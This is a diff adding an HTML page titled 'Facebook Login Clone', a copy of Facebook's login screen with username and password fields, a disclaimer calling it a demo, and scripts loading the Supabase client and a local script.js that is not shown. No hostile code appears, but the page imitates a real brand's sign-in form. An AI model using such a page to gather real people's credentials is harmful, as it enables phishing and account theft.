@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Clone</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="fb-login-container">
+      <div class="fb-login-box">
+        <div class="fb-login-logo"></div>
+        <h1 class="fb-login-heading">Log into Facebook</h1>
+        <form id="login-form">
+          <div class="input-container">
+            <input
+              type="text"
+              id="username"
+              name="username"
+              placeholder="Email or Phone Number"
+              required
+            />
+          </div>
+          <div class="input-container">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+          </div>
+          <button type="submit" class="fb-login-button">Log In</button>
+        </form>
+        <div class="fb-login-separator"></div>
+        <p class="fb-login-disclaimer">
+          This is a demo login page. Not affiliated with Facebook.
+        </p>
+      </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+
+    <script src="script.js"></script>
+  </body>
+</html>
